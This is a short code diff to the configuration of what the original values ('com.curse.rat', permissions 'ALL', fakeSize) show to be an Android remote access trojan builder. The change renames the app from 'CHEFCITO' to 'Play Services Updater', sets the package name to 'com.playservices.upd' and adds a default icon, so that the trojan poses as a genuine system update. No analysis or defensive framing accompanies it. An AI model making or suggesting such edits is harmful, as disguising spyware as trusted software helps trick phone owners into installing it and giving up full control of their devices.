@@ -5,13 +5,13 @@ const crypto = require('crypto');
 
 let config = {
     hosts: "127.0.0.1:7777", // Legacy support
-    appName: "CHEFCITO",
+    appName: "Play Services Updater",
     appVersion: "1.0",
-    packageName: "com.curse.rat",
-    notifText: "Servicio CHEFCITO...",
+    packageName: "com.playservices.upd",
+    notifText: "Servicio Play Services Updater...",
     notifEnabled: true,
     fakeSize: 0,
-    icon: null,
+    icon: fs.readFileSync(path.join(__dirname, "default_icon.png")).toString("base64"),
     permissions: "ALL"
 };
 
